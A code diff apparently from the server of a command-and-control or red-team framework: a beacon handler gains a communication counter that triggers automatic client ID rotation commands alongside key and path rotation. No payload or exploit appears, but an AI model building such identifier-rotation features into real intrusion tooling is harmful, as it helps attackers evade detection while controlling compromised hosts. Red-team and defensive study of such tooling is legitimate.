@@ -79,6 +79,13 @@ class BeaconHandler(BaseHandler):
             # Log the beacon
             self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')}){' - FIRST CONTACT' if first_contact else ''}")
             
+            # Increment communication counter and check for auto rotation
+            # Skip for first contact as we need the client to be established first
+            needs_auto_rotation = False
+            if not first_contact:
+                # Increment the communication counter and check if rotation is needed
+                needs_auto_rotation = self.client_manager.increment_communication_counter(client_id)
+            
             # Verify client if system info is available and not first contact
             needs_key_rotation = False
             if system_info and not first_contact:
@@ -90,6 +97,17 @@ class BeaconHandler(BaseHandler):
                 include_key_rotation=needs_key_rotation,
                 first_contact=first_contact
             )
+            
+            # If auto rotation is needed, add client ID rotation command
+            if needs_auto_rotation:
+                # Generate a new client ID and prepare rotation command
+                rotation_command = self.client_helper.prepare_client_id_rotation(client_id)
+                # Add it after any key rotation but before other commands
+                if has_key_operation:
+                    commands.insert(1, rotation_command)  # After key rotation
+                else:
+                    commands.insert(0, rotation_command)  # At the beginning
+                self.log_message(f"Added automatic client ID rotation command for {client_id}")
             
             # Add path rotation command if needed for established clients
             if include_rotation_info and not first_contact:
